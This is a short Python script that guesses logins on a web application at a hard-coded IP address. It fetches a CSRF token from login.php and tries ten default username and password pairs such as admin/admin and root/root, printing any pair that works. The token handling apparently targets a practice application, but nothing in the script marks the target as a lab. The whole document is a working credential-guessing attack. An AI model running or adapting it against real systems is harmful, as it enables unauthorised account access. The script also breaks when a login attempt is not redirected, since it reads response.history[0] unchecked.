
import requests
import re
from urllib.parse import urljoin

target = "http://31.97.117.123"
session = requests.Session()

# Common credentials to try
credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("user", "password"),
    ("test", "test"),
    ("admin", "admin123"),
    ("root", "root"),
    ("admin", ""),
    ("", "admin"),
    ("guest", "guest"),
]

attempt = 0
for username, password in credentials:
    attempt += 1
    if attempt > 10:
        print(f"[!] Reached 10 unsuccessful attempts, stopping")
        break
    
    # Get login page to extract token
    response = session.get(f"{target}/login.php")
    token_match = re.search(r"user_token.*?value='([^']+)'", response.text)
    
    if not token_match:
        print(f"[!] Could not extract token")
        continue
    
    token = token_match.group(1)
    
    # Attempt login
    login_data = {
        "username": username,
        "password": password,
        "user_token": token,
        "Login": "Login"
    }
    
    response = session.post(f"{target}/login.php", data=login_data)
    
    if "Location" in response.history[0].headers:
        redirect = response.history[0].headers.get("Location", "")
        if "index.php" in redirect or response.status_code == 200:
            print(f"[+] SUCCESS! Credentials found: {username}:{password}")
            # Check if we're logged in
            response = session.get(f"{target}/index.php")
            if "logout" in response.text.lower() or "welcome" in response.text.lower():
                print(f"[+] Confirmed logged in as {username}")
                break
    
    if "login" not in response.url.lower() or "incorrect" in response.text.lower() or "failed" in response.text.lower():
        print(f"[-] Attempt {attempt}: {username}:{password} - Failed")
    else:
        print(f"[-] Attempt {attempt}: {username}:{password} - No clear response")

print("\n[*] Login attempts completed")

